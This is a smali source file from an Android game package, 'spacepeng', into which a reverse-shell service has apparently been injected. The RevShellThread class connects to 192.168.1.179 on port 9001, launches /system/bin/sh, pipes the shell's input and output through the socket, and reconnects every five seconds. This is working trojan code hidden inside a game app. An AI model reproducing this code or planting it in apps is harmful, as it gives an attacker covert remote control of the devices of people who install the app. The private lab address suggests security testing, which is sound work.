.class Lde/fgerbig/spacepeng/android/RevShellService$RevShellThread;
.super Ljava/lang/Object;
.source "RevShellService.java"

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field final synthetic this$0:Lde/fgerbig/spacepeng/android/RevShellService;


# direct methods
.method constructor <init>(Lde/fgerbig/spacepeng/android/RevShellService;)V
    .locals 0

    iput-object p1, p0, Lde/fgerbig/spacepeng/android/RevShellService$RevShellThread;->this$0:Lde/fgerbig/spacepeng/android/RevShellService;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 10

    :goto_start
    :try_start_0
    # Debug
    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;
    const-string v1, "RevShellThread: Attempting connection to 192.168.1.179:9001"
    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    # Crea socket
    new-instance v0, Ljava/net/Socket;
    const-string v1, "192.168.1.179"
    const/16 v2, 0x2329    # Porta 9001
    invoke-direct {v0, v1, v2}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V

    sget-object v1, Ljava/lang/System;->out:Ljava/io/PrintStream;
    const-string v2, "RevShellThread: Connected!"
    invoke-virtual {v1, v2}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    # Esegui /system/bin/sh
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;
    move-result-object v1
    const-string v2, "/system/bin/sh"
    invoke-virtual {v1, v2}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;
    move-result-object v1

    # Ottieni stream
    invoke-virtual {v0}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;
    move-result-object v2

    invoke-virtual {v0}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;
    move-result-object v3

    invoke-virtual {v1}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;
    move-result-object v4

    invoke-virtual {v1}, Ljava/lang/Process;->getErrorStream()Ljava/io/InputStream;
    move-result-object v5

    invoke-virtual {v1}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;
    move-result-object v6

    # Thread per stdout -> socket
    new-instance v7, Ljava/lang/Thread;
    new-instance v8, Lde/fgerbig/spacepeng/android/RevShellService$StreamPiper;
    invoke-direct {v8, v4, v3}, Lde/fgerbig/spacepeng/android/RevShellService$StreamPiper;-><init>(Ljava/io/InputStream;Ljava/io/OutputStream;)V
    invoke-direct {v7, v8}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
    invoke-virtual {v7}, Ljava/lang/Thread;->start()V

    # Thread per stderr -> socket
    new-instance v7, Ljava/lang/Thread;
    new-instance v8, Lde/fgerbig/spacepeng/android/RevShellService$StreamPiper;
    invoke-direct {v8, v5, v3}, Lde/fgerbig/spacepeng/android/RevShellService$StreamPiper;-><init>(Ljava/io/InputStream;Ljava/io/OutputStream;)V
    invoke-direct {v7, v8}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
    invoke-virtual {v7}, Ljava/lang/Thread;->start()V

    # Main loop: socket -> stdin (con check isRunning)
    const/16 v7, 0x400
    new-array v7, v7, [B

    :goto_loop
    iget-object v8, p0, Lde/fgerbig/spacepeng/android/RevShellService$RevShellThread;->this$0:Lde/fgerbig/spacepeng/android/RevShellService;
    invoke-static {v8}, Lde/fgerbig/spacepeng/android/RevShellService;->access$000(Lde/fgerbig/spacepeng/android/RevShellService;)Z
    move-result v8
    if-eqz v8, :cond_0

    invoke-virtual {v2, v7}, Ljava/io/InputStream;->read([B)I
    move-result v8
    if-lez v8, :cond_0

    const/4 v9, 0x0
    invoke-virtual {v6, v7, v9, v8}, Ljava/io/OutputStream;->write([BII)V
    invoke-virtual {v6}, Ljava/io/OutputStream;->flush()V
    goto :goto_loop

    :cond_0
    invoke-virtual {v1}, Ljava/lang/Process;->destroy()V
    invoke-virtual {v0}, Ljava/net/Socket;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    # Attendi 5 secondi e riprova
    const-wide/16 v0, 0x1388
    :try_start_1
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    goto :goto_start
.end method
